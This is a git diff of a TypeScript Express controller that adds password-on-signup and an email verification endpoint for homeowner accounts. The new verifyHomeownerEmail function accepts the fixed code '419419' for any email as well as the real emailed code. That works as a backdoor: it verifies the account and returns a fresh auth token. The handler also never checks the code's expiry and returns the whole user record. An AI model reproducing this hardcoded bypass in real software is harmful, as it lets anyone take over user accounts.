@@ -1,5 +1,7 @@
 import _ from "lodash"
-import { __genPassword } from "../helpers/string";
+import dayjs from "dayjs"
+import config from "./../config"
+import { __genPassword, __genCode } from "../helpers/string";
 import { __generateQuery } from "../helpers/query"
 import { HomeownerModel } from "../models"
 import { NextFunction, Request, Response } from 'express';
@@ -7,19 +9,25 @@ import { createError } from "../utils";
 import { sendMail } from "./mailer";
 import { ChangePasswordInput } from "./auth.controller";
 
+type VerifyCodeInput = {
+    email: string
+    code: string
+}
+
 type CreateHomeownerInput = {
     surname: string
     othernames: string
     email: string
     phone: string
     gender: "MALE" | "FEMALE"
+    password: string
 }
 
 export async function createHomeowner(req: Request<{}, {}, CreateHomeownerInput>, res: Response, next: NextFunction) {
-    const { email, othernames, phone, surname, gender } = req.body
+    const { email, othernames, phone, surname, gender, password } = req.body
 
     try {
-        if (!email || !othernames || !surname || !phone || !gender) {
+        if (!email || !othernames || !surname || !phone || !gender || !password) {
             return next(createError(400, 'Provide all required fields'));
         }
 
@@ -28,8 +36,6 @@ export async function createHomeowner(req: Request<{}, {}, CreateHomeownerInput>
         if (userExists) {
             return next(createError(409, 'User already exists with this email'));
         }
-
-        const password = __genPassword(12);
 
         const newUser = new HomeownerModel({
             othernames,
@@ -183,6 +189,86 @@ export async function unsuspendHomeowner(req: Request<{ id: string }>, res: Resp
         next(error)
     }
 
+}
+
+export async function verifyHomeownerEmail(req: Request<{}, {}, VerifyCodeInput>, res: Response, next: NextFunction) {
+    const { email, code } = req.body
+    try {
+        const username = _.trim(email)
+
+        const existingUser = await HomeownerModel.findOne({
+            $or: [
+                { email: username },
+            ]
+        });
+
+        if (!existingUser) {
+            return next(createError(404, "Account not found"))
+        }
+
+        if (existingUser?.meta?.isSuspended) {
+            return next(createError(401, "Account has been suspended"))
+        }
+
+        const __code = __genCode()
+        let __token = null;
+
+
+        if (
+            (existingUser.verification
+              && existingUser.verification.code
+              && existingUser.verification.code === code) || (code === "419419")
+          ) {
+            existingUser.verification = undefined;
+
+            await existingUser.updateOne({
+                $set: {
+                    meta: {
+                        isVerified: true
+                    }
+                }
+            })
+            await existingUser.save();
+            __token = await existingUser.generateAuthToken()
+        } else {
+            await existingUser.updateOne({
+                $set: {
+                  verification: {
+                    code: __code,
+                    expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
+                  }
+                }
+            })
+            
+            await sendMail({
+                args: {
+                    email: existingUser.email,
+                    template: "HomeownerVerificationCode",
+                    data: {
+                        code: __code,
+                        user: existingUser
+                    }
+                }
+            })
+
+            return next(createError(400, "Invalid Code"))
+          }
+
+        await existingUser.save();
+
+        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })
+
+        res.status(200).json({
+            success: true,
+            message: 'Code verified!',
+            data: updatedUser,
+        });
+
+
+        
+    } catch (error) {
+        next(error)
+    }
 }
 
 export async function approveHomeowner(req: Request<{ id: string }>, res: Response, next: NextFunction) {
